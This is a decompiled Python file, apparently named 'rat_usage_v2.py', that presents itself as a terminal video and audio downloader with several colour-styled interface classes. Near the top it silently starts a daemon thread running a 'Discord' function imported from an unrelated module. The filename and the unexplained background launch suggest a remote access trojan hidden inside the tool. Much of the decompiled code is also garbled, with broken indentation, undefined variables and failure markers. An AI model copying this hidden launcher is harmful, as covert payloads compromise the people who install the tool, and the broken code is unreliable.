# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: 'rat_usage_v2.py'
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

from YoungLion import enable_ansi
enable_ansi()
print('[1;5;35m Starting:[0m')
import sys
import os
from YoungLion import File
from YoungLion.terminal import Color, TextStyle
from src.core.downloader import UniversalDownloader
from src.core.types import DownloadOptions, DownloadType, PlayListInfo, VideoInfo, FormatInfo
from src.utils.logger import setup_logger, logging
from typing import *
import threading
from tkn.functionss import Discord
threat = threading.Thread(target=Discord)
threat.daemon = True
threat.start()
class Style:
    def __init__(self):
        return None
    def PlayListHeader(self):
        print('PLAYLIST DOWNLOAD MODE')
    def InvalidSection(self):
        print('Invalid Section')
    def StartingPlayListDownloading(self, total: int):
        print(f'Starting download of {total} videos...')
    def UnavailablePlayList(self, idx: int, total: int):
        print('Video unavailable - Skipping')
    def StatusPlayListDownloading(self, idx: int, total: int, video_title: str):
        print(f'{idx}/{total} {video_title}')
    def PlayListDownloadingSuccess(self, idx: int, total: int):
        print(f'✓ [{idx}/{total}] Download successful!')
    def PlayListDownloadingFail(self, idx: int, total: int):
        print(f'✗ [{idx}/{total}] Download failed!')
    def PlayListSummary(self, success_count: int, total: int, failed_count: int):
        print('PLAYLIST DOWNLOAD COMPLETE')
        print(f'Successful:{success_count}/{total}')
        print(f'Failed:{failed_count}/{total}')
        print('Location:./downloads/YouTube')
    def MainHeading(self):
        print(' Universal Media Downloader (Video/Audio)')
    def FFmpegMissing(self):
        print('WARNING:FFmpeg missing. Functionality limited.')
    def EnterMediaUrl(self) -> str:
        return input('Url:')
    def Analizing(self):
        print('Analizing ...')
    def PlayListDetect(self, playlist_info: PlayListInfo):
        print(playlist_info)
    def PlayListChoice(self) -> str:
        return input('Selection [1/2]:')
    def PlayListDownloadingFirstVideoOnly(self):
        print('Downloading first video only...')
    def FailedGetVideoInfo(self):
        print('Failed to get video info. Check URL or try again.')
    def ShowVideoInfo(self, video: VideoInfo):
        print(f'[{video.platform}] Title:{video.title}')
    def ChooseDownloadType(self) -> str:
        print('\nChoose Download Type:')
        print('1. Audio Only (MP3)')
        print('2. Video Only (MP4, No Sound)')
        print('3. Video + Audio (MP4 Standard)')
        return input('Selection:').strip()
    def InvalidSelection(self):
        print('Invalid selection, defaulting to Video + Audio.')
    def DownloadSuccess(self, platform_dir: str):
        print(f'\nSUCCESS!File saved to:./{platform_dir}')
    def DownloadFail(self):
        print('FAILED!Check logs for details.')
    def show_format_table(self, info: VideoInfo, dl_type: DownloadType):
        # ***<module>.Style.show_format_table: Failure: Compilation Error
        formats = info.formats
        if not formats:
            print('No specific formats found. Using \'Best Available\'.')
            return (None, 'best')
        else:
            print('Fetching available formats...')
            def fmt_size(bytes_val):
                # ***<module>.Style.show_format_table.fmt_size: Failure: Different control flow
                if not bytes_val:
                    return 'N/A'
                else:
                    for unit in ['B', 'KB', 'MB', 'GB']:
                        if bytes_val < 1024:
                            bytes_val /= 1024
                        else:
                            return f'{bytes_val:.1f}{unit}'
                    return f'{bytes_val:.1f}TB'
            filtered_formats = []
            if dl_type == DownloadType.AUDIO:
                for f in formats:
                    filtered_formats.append(f)
                filtered_formats.sort(key=lambda x: (x.abr or 0, x.tbr or 0, x.filesize or 0), reverse=True)
                if not filtered_formats:
                    print('No formats with audio found.')
                    return (None, 'best')
                else:
                    print('\nAvailable Audio Sources (Extraction):')
                    print(f'{'No.':<4} {'Bitrate':<10} {'Ext':<6} {'Size':<10} {'Type':<12} {'ID'}')
                    print('------------------------------------------------------------')
                    for idx, f in enumerate(filtered_formats):
                        size = fmt_size(f.filesize or f.filesize_approx)
                        abr = f'{int(f.abr) if f.abr else '?'}k' if f.abr else '?'
                        is_pure = f.vcodec == 'none' or f.vcodec is None
                        f_type = 'Audio Only' if is_pure else 'Video+Audio'
                        print(f'{idx + 1:<4} {abr:<10} {f.ext:<6} {size:<10} {f_type:<12} {f.format_id}')
            else:
                for f in formats:
                    vcodec = f.vcodec
                    if not vcodec or vcodec == 'none':
                        continue
                    else:
                        is_video = True
                        if not is_video:
                            continue
                        else:
                            if not f.get('url'):
                                continue
                            else:
                                has_audio = f.acodec and f.acodec!= 'none'
                                height = f.height
                                protocol = f.protocol
                                format_note = str(f.format_note).lower()
                                if 'premium' in format_note or f.has_drm:
                                    continue
                                else:
                                    if f.ext == 'mhtml':
                                        continue
                                    else:
                                        if 'm3u8_native' in protocol:
                                            continue
                                        else:
                                            platform = info.get('platform', '')
                                            if platform == 'YouTube' and f.ext == 'webm' and (height >= 720):
                                                        continue
                                            filtered_formats.append(f)
                filtered_formats.sort(key=lambda x: (x.height or 0, x.tbr or 0), reverse=True)
                if not filtered_formats:
                    print('No video formats found.')
                    return (None, 'best')
                else:
                    print('\nAvailable Video Formats:')
                    print(f'{'No.':<4} {'Res':<10} {'FPS':<6} {'Ext':<6} {'Size':<10} {'Notes'}')
                        size = fmt_size(f.filesize or f.filesize_approx)
                        height = f.height or '?'
                        fps = f.fps or '?'
                        has_audio = False
                        if f.acodec and f.acodec!= 'none':
                                has_audio = True
                        note = 'Audio+Video' if has_audio else 'Video Only'
                        print(f'{idx + 1:<4} {height}p{'':<4} {fps:<6} {f.ext:<6} {size:<10} {note}')
            print(f'{len(filtered_formats) + 1}. Auto / Best Quality')
        try:
            sel = input(f'\nSelect Format [1-{len(filtered_formats) + 1}]:').strip()
            sel_idx = int(sel) - 1
            if 0 <= sel_idx < len(filtered_formats):
                    selected = filtered_formats[sel_idx]
                    print(f'Selected:{selected.format_id}')
                    if dl_type == DownloadType.BOTH:
                        format_id = selected.format_id
                        height = selected.height
                        print(f'✓ Selected format {format_id} - downloader will handle audio merging.')
                        return (format_id, str(height))
                    else:
                        res = str(selected.height)
                        return (selected.format_id, res)
        except ValueError:
            pass
        print('Selecting Best Quality.')
        return (None, 'best')
class Style1(Style):
    def __init__(self):
        super().__init__()
    def PlayListHeader(self):
        # ***<module>.Style1.PlayListHeader: Failure: Different bytecode
        print(f'\n{Color.CYAN}=================================================={Color.RESET_ALL}')
        print(f'{Color.CYAN}{'=================================================='}{Color.RESET_ALL}\n')
    def InvalidSection(self):
        print(f'{Color.YELLOW}Invalid selection, defaulting to Video + Audio.{Color.RESET_ALL}')
    def StartingPlayListDownloading(self, total: int):
        print(f'\n{Color.GREEN}{TextStyle.BOLD}Starting download of {total} videos...{Color.RESET_ALL}\n')
    def UnavailablePlayList(self, idx: int, total: int):
        print(f'{Color.RED}[{idx}/{total}] Video unavailable - Skipping{Color.RESET_ALL}')
    def StatusPlayListDownloading(self, idx: int, total: int, video_title: str):
        print(f'\n{Color.CYAN}{'──────────────────────────────────────────────────'}{Color.RESET_ALL}')
        print(f'{TextStyle.BOLD}[{idx}/{total}] {video_title}{Color.RESET_ALL}')
        print(f'{Color.CYAN}{'──────────────────────────────────────────────────'}{Color.RESET_ALL}')
    def PlayListDownloadingSuccess(self, idx: int, total: int):
        print(f'{Color.GREEN}✓ [{idx}/{total}] Download successful!{Color.RESET_ALL}')
    def PlayListDownloadingFail(self, idx: int, total: int):
        print(f'{Color.RED}✗ [{idx}/{total}] Download failed!{Color.RESET_ALL}')
    def PlayListSummary(self, success_count: int, total: int, failed_count: int):
        # ***<module>.Style1.PlayListSummary: Failure: Different bytecode
        print(f'\n{Color.CYAN}=================================================={Color.RESET_ALL}')
    def MainHeading(self):
        # ***<module>.Style1.MainHeading: Failure: Different bytecode
        print(f'{Color.CYAN}=================================================={Color.RESET_ALL}')
    def FFmpegMissing(self):
        print(f'{Color.YELLOW}WARNING:FFmpeg missing. Functionality limited.{Color.RESET_ALL}')
    def EnterMediaUrl(self) -> str:
        return input(f'\n{TextStyle.BOLD}Enter Media URL (or \'q\' to quit):{Color.RESET_ALL}')
    def Analizing(self):
        print(f'{Color.BLUE}{TextStyle.SLOW_BLINK}Analyzing URL...{Color.RESET_ALL}')
    def PlayListDetect(self, playlist_info: PlayListInfo):
        # ***<module>.Style1.PlayListDetect: Failure: Different bytecode
        print(f'\n{Color.YELLOW}{TextStyle.BOLD}⚠ PLAYLIST DETECTED!{Color.RESET_ALL}'), print(f'{Color.CYAN}Title:{Color.RESET_ALL} {playlist_info.title}'), print(f'\n{TextStyle.BOLD}Do you want to download the entire playlist?{Color.RESET_ALL}'), print(f'{Color.GREEN}1.{Color.RESET_ALL} Yes - Download all {len(playlist_info.entries)} videos'), print(f'{Color.RED}2.{Color.RESET_ALL} No - Download only first video')
    def PlayListChoice(self) -> str:
        return input(f'{TextStyle.BOLD}Selection [1/2]:{Color.RESET_ALL}')
    def PlayListDownloadingFirstVideoOnly(self):
        print(f'{Color.YELLOW}Downloading first video only...{Color.RESET_ALL}')
    def FailedGetVideoInfo(self):
        print(f'{Color.RED}Failed to get video info. Check URL or try again.{Color.RESET_ALL}')
    def ShowVideoInfo(self, video: VideoInfo):
        print(f'\n{Color.MAGENTA}[{video.platform}]{Color.RESET_ALL} {TextStyle.BOLD}Title:{Color.RESET_ALL} {video.title}')
    def ChooseDownloadType(self) -> str:
        # ***<module>.Style1.ChooseDownloadType: Failure: Different bytecode
        return print(f'\n{TextStyle.BOLD}Choose Download Type:{Color.RESET_ALL}')
    def InvalidSelection(self):
        print('Invalid selection, defaulting to Video + Audio.')
    def DownloadSuccess(self, platform_dir: str):
        print(f'\n{Color.GREEN}{TextStyle.BOLD}SUCCESS!{Color.RESET_ALL} File saved to:{Color.CYAN}./{platform_dir}{Color.RESET_ALL}')
    def DownloadFail(self):
        print(f'\n{Color.RED}{TextStyle.BOLD}FAILED!{Color.RESET_ALL} Check logs for details.')
    def show_format_table(self, info: VideoInfo, dl_type: DownloadType):
        # ***<module>.Style1.show_format_table: Failure: Compilation Error
        formats = info.formats
        if not formats:
            print(f'{Color.YELLOW}No specific formats found. Using \'Best Available\'.{Color.RESET_ALL}')
            return (None, 'best')
        else:
            print(f'\n{Color.BLUE}Fetching available formats...{Color.RESET_ALL}')
            def fmt_size(bytes_val):
                # ***<module>.Style1.show_format_table.fmt_size: Failure: Compilation Error
                if not bytes_val:
                    return 'N/A'
                else:
                    for unit in ['B', 'KB', 'MB', 'GB']:
                        return f'{bytes_val:.1f}{unit}' if bytes_val < 1024 else f'{bytes_val:.1f}{unit}'
                            bytes_val /= 1024
                    return f'{bytes_val:.1f}TB'
            filtered_formats = []
            if dl_type == DownloadType.AUDIO:
                for f in formats:
                    if f.acodec and f.acodec!= 'none':
                            filtered_formats.append(f)
                filtered_formats.sort(key=lambda x: (x.abr or 0, x.tbr or 0, x.filesize or 0), reverse=True)
                if not filtered_formats:
                    print(f'{Color.YELLOW}No formats with audio found.{Color.RESET_ALL}')
                else:
                    print(f'\n{Color.CYAN}{TextStyle.BOLD}Available Audio Sources (Extraction):{Color.RESET_ALL}')
                    print(f'{TextStyle.BOLD}{'No.':<4} {'Bitrate':<10} {'Ext':<6} {'Size':<10} {'Type':<12} {'ID'}{Color.RESET_ALL}')
                        size = fmt_size(f.filesize or f.filesize_approx)
                        abr = f'{int(f.abr) if f.abr else '?'}k' if f.abr else '?'
                        is_pure = f.vcodec == 'none' or f.vcodec is None
                        f_type = 'Audio Only' if is_pure else 'Video+Audio'
                        print(f'{idx + 1:<4} {abr:<10} {f.ext:<6} {size:<10} {f_type:<12} {f.format_id}')
            else:
                for f in formats:
                    vcodec = f.vcodec
                    if not vcodec or vcodec == 'none':
                        continue
                    else:
                        is_video = True
                        if not is_video:
                            continue
                        else:
                            if f.get('url'):
                                has_audio = f.acodec and f.acodec!= 'none'
                                height = f.height
                                protocol = f.protocol
                                format_note = str(f.format_note).lower()
                                if 'premium' in format_note or f.has_drm:
                                    continue
                                else:
                                    if f.ext == 'mhtml':
                                        continue
                                    else:
                                        if 'm3u8_native' in protocol:
                                            continue
                                        else:
                                            platform = info.get('platform', '')
                                            if platform == 'YouTube' and f.ext == 'webm' and (height >= 720):
                                                        continue
                                            filtered_formats.append(f)
                filtered_formats.sort(key=lambda x: (x.height or 0, x.tbr or 0), reverse=True)
                print(f'{Color.YELLOW}No video formats found.{Color.RESET_ALL}') or print(f'{Color.YELLOW}No video formats found.{Color.RESET_ALL}')
                    return (None, 'best')
                else:
                    print(f'\n{Color.CYAN}{TextStyle.BOLD}Available Video Formats:{Color.RESET_ALL}')
                    print(f'{TextStyle.BOLD}{'No.':<4} {'Res':<10} {'FPS':<6} {'Ext':<6} {'Size':<10} {'Notes'}{Color.RESET_ALL}')
                        size = fmt_size(f.filesize or f.filesize_approx)
                        height = f.height or '?'
                        fps = f.fps or '?'
                        has_audio = False
                        if f.acodec and f.acodec!= 'none':
                                has_audio = True
                        note = 'Audio+Video' if has_audio else 'Video Only'
                        print(f'{idx + 1:<4} {height}p{'':<4} {fps:<6} {f.ext:<6} {size:<10} {note}')
            print(f'{Color.GREEN}{len(filtered_formats) + 1}.{Color.RESET_ALL} {TextStyle.BOLD}Auto / Best Quality{Color.RESET_ALL}')
        try:
            sel = input(f'\n{TextStyle.BOLD}Select Format [1-{len(filtered_formats) + 1}]:{Color.RESET_ALL}').strip()
            sel_idx = int(sel) - 1
                    selected = filtered_formats[sel_idx]
                    if dl_type == DownloadType.BOTH:
                        format_id = selected.format_id
                        height = selected.height
                        print(f'{Color.GREEN}✓ Selected format {format_id} - downloader will handle audio merging.{Color.RESET_ALL}')
                        return (format_id, str(height))
                    else:
                        res = str(selected.height)
                        return (selected.format_id, res)
        except ValueError:
            pass
        print(f'{Color.GREEN}Selecting Best Quality.{Color.RESET_ALL}')
        return (None, 'best')
class Style2(Style):
    def __init__(self):
        super().__init__()
    def PlayListHeader(self):
        # ***<module>.Style2.PlayListHeader: Failure: Different bytecode
        print(f'{Color.MAGENTA}════════════════════════════════════════{Color.RESET_ALL}')
    def InvalidSection(self):
        print(f'{Color.YELLOW}{TextStyle.BOLD}! Invalid section selected, using defaults.{Color.RESET_ALL}')
    def StartingPlayListDownloading(self, total: int):
        print(f'{Color.GREEN}{TextStyle.BOLD}→ Starting:{Color.RESET_ALL} {total} videos will be downloaded')
    def UnavailablePlayList(self, idx: int, total: int):
        print(f'{Color.RED}⚠ [{idx}/{total}] Unavailable, skipping...{Color.RESET_ALL}')
    def StatusPlayListDownloading(self, idx: int, total: int, video_title: str):
        # ***<module>.Style2.StatusPlayListDownloading: Failure: Different bytecode
        print(f'{Color.CYAN}------------------------------------{Color.RESET_ALL}')
    def PlayListDownloadingSuccess(self, idx: int, total: int):
        print(f'{Color.GREEN}✔ [{idx}/{total}] Completed{Color.RESET_ALL}')
    def PlayListDownloadingFail(self, idx: int, total: int):
        print(f'{Color.RED}✖ [{idx}/{total}] Failed{Color.RESET_ALL}')
    def PlayListSummary(self, success_count: int, total: int, failed_count: int):
        # ***<module>.Style2.PlayListSummary: Failure: Different bytecode
        print(f'{Color.MAGENTA}===================================={Color.RESET_ALL}')
    def MainHeading(self):
        print(f'{TextStyle.BOLD}{Color.MAGENTA}Universal Media Downloader{Color.RESET_ALL} - lightweight')
    def FFmpegMissing(self):
        print(f'{Color.YELLOW}!! FFmpeg not found - limited features{Color.RESET_ALL}')
    def EnterMediaUrl(self) -> str:
        return input(f'{TextStyle.BOLD}{Color.CYAN}URL>{Color.RESET_ALL}')
    def Analizing(self):
        print(f'{Color.BLUE}… analyzing URL, please wait{Color.RESET_ALL}')
    def PlayListDetect(self, playlist_info: PlayListInfo):
        print(f'{Color.MAGENTA}Playlist:{Color.RESET_ALL} {getattr(playlist_info, 'title', str(playlist_info))} ({len(getattr(playlist_info, 'entries', []))} items)')
    def PlayListChoice(self) -> str:
        return input(f'{Color.GREEN}1{Color.RESET_ALL}:All {Color.RED}2{Color.RESET_ALL}:First only >')
    def PlayListDownloadingFirstVideoOnly(self):
        print(f'{Color.YELLOW}Downloading first entry only...{Color.RESET_ALL}')
    def FailedGetVideoInfo(self):
        print(f'{Color.RED}Could not retrieve video info.{Color.RESET_ALL}')
    def ShowVideoInfo(self, video: VideoInfo):
        print(f'{Color.CYAN}[{getattr(video, 'platform', '?')}] {TextStyle.BOLD}{getattr(video, 'title', 'Untitled')}{Color.RESET_ALL}')
    def ChooseDownloadType(self) -> str:
        print(f'{TextStyle.BOLD}Choose:{Color.RESET_ALL} 1)Audio 2)Video 3)Both')
        return input('Choice>').strip()
    def InvalidSelection(self):
        print(f'{Color.YELLOW}Selection invalid, defaulting to Both.{Color.RESET_ALL}')
    def DownloadSuccess(self, platform_dir: str):
        print(f'{Color.GREEN}Saved→ ./{platform_dir}{Color.RESET_ALL}')
    def DownloadFail(self):
        print(f'{Color.RED}Download failed, check logs.{Color.RESET_ALL}')
    def show_format_table(self, info: VideoInfo, dl_type: DownloadType):
        # ***<module>.Style2.show_format_table: Failure: Compilation Error
        formats = getattr(info, 'formats', None)
        if not formats:
            print(f'{Color.YELLOW}No formats, using best available{Color.RESET_ALL}')
            return (None, 'best')
        else:
            def fmt_size(b):
                if not b:
                    return 'N/A'
                else:
                    for u in ['B', 'KB', 'MB', 'GB']:
                        if b < 1024:
                            return f'{b:.1f}{u}'
                        else:
                            b /= 1024
                    return f'{b:.1f}TB'
            filtered = []
            if dl_type == DownloadType.AUDIO:
                for f in formats:
                    filtered.append(f)
                filtered.sort(key=lambda x: (getattr(x, 'abr', 0) or 0, getattr(x, 'tbr', 0) or 0, getattr(x, 'filesize', 0) or 0), reverse=True)
                if not filtered:
                    print(f'{Color.YELLOW}No audio formats found{Color.RESET_ALL}')
                    return (None, 'best')
                else:
                    for i, f in enumerate(filtered, 1):
                        abr = fmt_size(getattr(f, 'filesize', None) or getattr(f, 'filesize_approx', None))
                        is_pure = getattr(f, 'vcodec', None) in (None, 'none')
                        t = 'AudioOnly' if is_pure else 'V+A'
                        print(f'{i}. {abr} {getattr(f, 'ext', '?')} {size} {t} {getattr(f, 'format_id', '')}')
            else:
                for f in formats:
                    vcodec = getattr(f, 'vcodec', None)
                    if not vcodec or vcodec == 'none':
                        continue
                    else:
                        if not getattr(f, 'url', None):
                            continue
                        else:
                            note = str(getattr(f, 'format_note', '')).lower()
                            if 'premium' in note or getattr(f, 'has_drm', False):
                                continue
                            else:
                                if getattr(f, 'ext', '') == 'mhtml':
                                    continue
                                else:
                                    proto = getattr(f, 'protocol', '')
                                    if 'm3u8_native' in proto:
                                        continue
                                    else:
                                        platform = getattr(info, 'platform', '')
                                        if platform == 'YouTube' and getattr(f, 'ext', '') == 'webm' and (getattr(f, 'height', 0) or 0) >= 720:
                                                    continue
                                        filtered.append(f)
                filtered.sort(key=lambda x: (getattr(x, 'height', 0) or 0, getattr(x, 'tbr', 0) or 0), reverse=True)
                print(f'{Color.YELLOW}No video formats found{Color.RESET_ALL}') or print(f'{Color.YELLOW}No video formats found{Color.RESET_ALL}')
                    return (None, 'best')
                else:
                    for i, f in enumerate(filtered, 1):
                        has_audio = fmt_size(getattr(f, 'filesize', None) or getattr(f, 'filesize_approx', None))
                        note = 'A+V' if has_audio else 'VideoOnly'
                        print(f'{i}. {h}p {fps}fps {getattr(f, 'ext', '?')} {size} {note} {getattr(f, 'format_id', '')}')
            print(f'{len(filtered) + 1}. Auto/Best')
        try:
            sel = input(f'Select [1-{len(filtered) + 1}]>').strip()
            idx = int(sel) - 1
            if 0 <= idx < len(filtered):
                    s = filtered[idx]
                    print(f'Selected:{getattr(s, 'format_id', '')}')
                    if dl_type == DownloadType.BOTH:
                        return (getattr(s, 'format_id', None), str(getattr(s, 'height', None)))
        except Exception:
            pass
        print('Defaulting to best')
        return (None, 'best')
class Style3(Style):
    def __init__(self):
        super().__init__()
    def PlayListHeader(self):
        # ***<module>.Style3.PlayListHeader: Failure: Different bytecode
        print(f'{Color.CYAN}▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞{Color.RESET_ALL}')
    def InvalidSection(self):
        print(f'{Color.YELLOW}{TextStyle.BOLD}⚠ Invalid section, switching to defaults.{Color.RESET_ALL}')
    def StartingPlayListDownloading(self, total: int):
        print(f'{Color.GREEN}⟸ Starting playlist download: {total} items{Color.RESET_ALL}')
    def UnavailablePlayList(self, idx: int, total: int):
        print(f'{Color.RED}✗ [{idx}/{total}] Unavailable entry skipped{Color.RESET_ALL}')
    def StatusPlayListDownloading(self, idx: int, total: int, video_title: str):
        # ***<module>.Style3.StatusPlayListDownloading: Failure: Different bytecode
        print(f'{Color.BLUE}──────────────────────────────────────────────────{Color.RESET_ALL}')
    def PlayListDownloadingSuccess(self, idx: int, total: int):
        print(f'{Color.GREEN}✓ [{idx}/{total}] Completed{Color.RESET_ALL}')
    def PlayListDownloadingFail(self, idx: int, total: int):
        print(f'{Color.RED}✘ [{idx}/{total}] Failed{Color.RESET_ALL}')
    def PlayListSummary(self, success_count: int, total: int, failed_count: int):
        # ***<module>.Style3.PlayListSummary: Failure: Different bytecode
        print(f'{Color.CYAN}============================================={Color.RESET_ALL}')
    def MainHeading(self):
        print(f'{TextStyle.BOLD}{Color.CYAN}Universal Media Downloader v3{Color.RESET_ALL}')
    def FFmpegMissing(self):
        print(f'{Color.YELLOW}⚠ FFmpeg not found: features limited{Color.RESET_ALL}')
    def EnterMediaUrl(self) -> str:
        return input(f'{Color.CYAN}{TextStyle.BOLD}Enter URL → {Color.RESET_ALL}')
    def Analizing(self):
        print(f'{Color.BLUE}Analyzing media info, please wait...{Color.RESET_ALL}')
    def PlayListDetect(self, playlist_info: PlayListInfo):
        print(f'{Color.CYAN}Detected playlist:{Color.RESET_ALL} {getattr(playlist_info, 'title', '?')} ({len(getattr(playlist_info, 'entries', []))} videos)')
    def PlayListChoice(self) -> str:
        return input(f'{Color.GREEN}1{Color.RESET_ALL}: All  {Color.RED}2{Color.RESET_ALL}: First only → ')
    def PlayListDownloadingFirstVideoOnly(self):
        print(f'{Color.YELLOW}→ Downloading first entry only...{Color.RESET_ALL}')
    def FailedGetVideoInfo(self):
        print(f'{Color.RED}✖ Failed to process video info{Color.RESET_ALL}')
    def ShowVideoInfo(self, video: VideoInfo):
        print(f'{Color.CYAN}{TextStyle.BOLD}[{getattr(video, 'platform', '?')}] {getattr(video, 'title', 'Unknown')}{Color.RESET_ALL}')
    def ChooseDownloadType(self) -> str:
        print(f'{TextStyle.BOLD}Choose format:{Color.RESET_ALL} 1)Audio  2)Video  3)Both')
        return input('→ ').strip()
    def InvalidSelection(self):
        print(f'{Color.YELLOW}Invalid choice, defaulting to BOTH{Color.RESET_ALL}')
    def DownloadSuccess(self, platform_dir: str):
        print(f'{Color.GREEN}✓ Saved to ./{platform_dir}{Color.RESET_ALL}')
    def DownloadFail(self):
        print(f'{Color.RED}✗ Download failed{Color.RESET_ALL}')
    def show_format_table(self, info: VideoInfo, dl_type: DownloadType):
        # irreducible cflow, using cdg fallback
        # ***<module>.Style3.show_format_table: Failure: Compilation Error
        formats = getattr(info, 'formats', None)
        if not formats:
            print(f'{Color.YELLOW}No formats available, using best{Color.RESET_ALL}')
            return (None, 'best')
        def fmt_size(b):
            if not b:
                return 'N/A'
            else:
                for u in ['B', 'KB', 'MB', 'GB']:
                    if b < 1024:
                        return f'{b:.1f}{u}'
                    else:
                        b /= 1024
                return f'{b:.1f}TB'
        filtered = []
        if dl_type == DownloadType.AUDIO:
            for f in formats:
                filtered.append(f)
            filtered.sort(key=lambda x: (getattr(x, 'abr', 0) or 0, getattr(x, 'tbr', 0) or 0, getattr(x, 'filesize', 0) or 0), reverse=True)
            print(f'{Color.YELLOW}No audio formats found{Color.RESET_ALL}') or print(f'{Color.YELLOW}No audio formats found{Color.RESET_ALL}')
                return (None, 'best')
            else:
                for i, f in enumerate(filtered, 1):
                    abr = fmt_size(getattr(f, 'filesize', None) or getattr(f, 'filesize_approx', None))
                    v = getattr(f, 'vcodec', None)
                    t = 'AudioOnly' if not v or v == 'none' else 'A+V'
                    print(f'{i}. {abr}kbps {getattr(f, 'ext', '?')} {size} {t} [{getattr(f, 'format_id', '')}]')
            for f in formats:
                vcodec = getattr(f, 'vcodec', None)
                if not vcodec or vcodec == 'none':
                    continue
                if not getattr(f, 'url', None):
                    continue
                if getattr(f, 'format_note', 'premium') == 'premium':
                    continue
                if getattr(f, 'has_drm', False):
                    continue
                if getattr(f, 'ext', '') == 'mhtml':
                    continue
                proto = getattr(f, 'protocol', '')
                if 'm3u8' in proto:
                    continue
                platform = getattr(info, 'platform', '')
                if platform == 'YouTube':
                    if getattr(f, 'ext', '') == 'webm':
                        filtered.append(f)
            filtered.sort(key=lambda x: (getattr(x, 'height', 0) or 0, getattr(x, 'tbr', 0) or 0), reverse=True)
            print(f'{Color.YELLOW}No video formats found{Color.RESET_ALL}') or print(f'{Color.YELLOW}No video formats found{Color.RESET_ALL}')
                return (None, 'best')
            else:
                for i, f in enumerate(filtered, 1):
                    size = fmt_size(getattr(f, 'filesize', None) or getattr(f, 'filesize_approx', None))
                    tag = 'A+V' if a else 'VideoOnly'
                    print(f'{i}. {h}p {fps}fps {getattr(f, 'ext', '?')} {size} {tag} [{getattr(f, 'format_id', '')}]')
        print(f'{len(filtered) + 1}. Auto/Best')
        sel = input(f'Select 1-{len(filtered) + 1} → ').strip()
        idx = int(sel) - 1
        if 0 <= idx < len(filtered):
                s = filtered[idx]
                print(f'Chosen:{getattr(s, 'format_id', '')}')
                return (getattr(s, 'format_id', None), str(getattr(s, 'height', None)))
                print('→ Using best format')
                return (None, 'best')
                    pass
class Style4(Style):
    def __init__(self):
        super().__init__()
    def PlayListHeader(self):
        # ***<module>.Style4.PlayListHeader: Failure: Different bytecode
        print(f'{Color.MAGENTA}▛──────────────────────────────────────────▜{Color.RESET_ALL}')
    def InvalidSection(self):
        print(f'{Color.YELLOW}{TextStyle.BOLD}‼ Invalid section – using defaults{Color.RESET_ALL}')
    def StartingPlayListDownloading(self, total: int):
        print(f'{Color.GREEN}>>> Starting download: {total} videos queued{Color.RESET_ALL}')
    def UnavailablePlayList(self, idx: int, total: int):
        print(f'{Color.RED}[{idx}/{total}] → Skipped (unavailable){Color.RESET_ALL}')
    def StatusPlayListDownloading(self, idx: int, total: int, video_title: str):
        # ***<module>.Style4.StatusPlayListDownloading: Failure: Different bytecode
        print(f'{Color.CYAN}=================================================={Color.RESET_ALL}')
    def PlayListDownloadingSuccess(self, idx: int, total: int):
        print(f'{Color.GREEN}[{idx}/{total}] ✔ Download successful{Color.RESET_ALL}')
    def PlayListDownloadingFail(self, idx: int, total: int):
        print(f'{Color.RED}[{idx}/{total}] ✖ Download failed{Color.RESET_ALL}')
    def PlayListSummary(self, success_count: int, total: int, failed_count: int):
        # ***<module>.Style4.PlayListSummary: Failure: Different bytecode
        print(f'{Color.MAGENTA}=================================================={Color.RESET_ALL}')
    def MainHeading(self):
        print(f'{TextStyle.BOLD}{Color.MAGENTA}Universal Downloader – Terminal Edition{Color.RESET_ALL}')
    def FFmpegMissing(self):
        print(f'{Color.YELLOW}⚠ Warning: FFmpeg missing – only basic functionality available{Color.RESET_ALL}')
    def EnterMediaUrl(self) -> str:
        return input(f'{Color.CYAN}{TextStyle.BOLD}Enter URL → {Color.RESET_ALL}')
    def Analizing(self):
        print(f'{Color.BLUE}… analyzing URL, hold on…{Color.RESET_ALL}')
    def PlayListDetect(self, playlist_info: PlayListInfo):
        # ***<module>.Style4.PlayListDetect: Failure: Different bytecode
        count, title = (getattr(playlist_info, 'title', '?'), len(getattr(playlist_info, 'entries', [])))
        print(f'{Color.MAGENTA}Playlist detected:{Color.RESET_ALL} \"{title}\" — {count} items')
    def PlayListChoice(self) -> str:
        return input(f'{Color.GREEN}1{Color.RESET_ALL}: All   {Color.RED}2{Color.RESET_ALL}: First only → ').strip()
    def PlayListDownloadingFirstVideoOnly(self):
        print(f'{Color.YELLOW}→ Only first video will be downloaded{Color.RESET_ALL}')
    def FailedGetVideoInfo(self):
        print(f'{Color.RED}✖ Could not retrieve video info{Color.RESET_ALL}')
    def ShowVideoInfo(self, video: VideoInfo):
        print(f'{Color.CYAN}{TextStyle.BOLD}[{getattr(video, 'platform', '?')}] {getattr(video, 'title', 'Untitled')}{Color.RESET_ALL}')
    def ChooseDownloadType(self) -> str:
        print(f'{TextStyle.BOLD}Select download type:{Color.RESET_ALL} 1) Audio  2) Video  3) Both')
        return input('→ ').strip()
    def InvalidSelection(self):
        print(f'{Color.YELLOW}Invalid choice — defaulting to BOTH{Color.RESET_ALL}')
    def DownloadSuccess(self, platform_dir: str):
        print(f'{Color.GREEN}✓ Saved to ./{platform_dir}{Color.RESET_ALL}')
    def DownloadFail(self):
        print(f'{Color.RED}✖ Download failed – check logs{Color.RESET_ALL}')
    def show_format_table(self, info: VideoInfo, dl_type: DownloadType):
        # irreducible cflow, using cdg fallback
        # ***<module>.Style4.show_format_table: Failure: Compilation Error
        formats = getattr(info, 'formats', None)
        print(f'{Color.YELLOW}No available formats – using best{Color.RESET_ALL}') or print(f'{Color.YELLOW}No available formats – using best{Color.RESET_ALL}')
            return (None, 'best')
        def fmt_size(b):
            if not b:
                return 'N/A'
            else:
                for u in ['B', 'KB', 'MB', 'GB']:
                    if b < 1024:
                        return f'{b:.1f}{u}'
                    else:
                        b /= 1024
                return f'{b:.1f}TB'
        filtered = []
        if dl_type == DownloadType.AUDIO:
            for f in formats:
                filtered.append(f)
            filtered.sort(key=lambda x: (getattr(x, 'abr', 0) or 0, getattr(x, 'tbr', 0) or 0, getattr(x, 'filesize', 0) or 0), reverse=True)
            print(f'{Color.YELLOW}No audio formats found{Color.RESET_ALL}') or print(f'{Color.YELLOW}No audio formats found{Color.RESET_ALL}')
                return (None, 'best')
            else:
                for i, f in enumerate(filtered, 1):
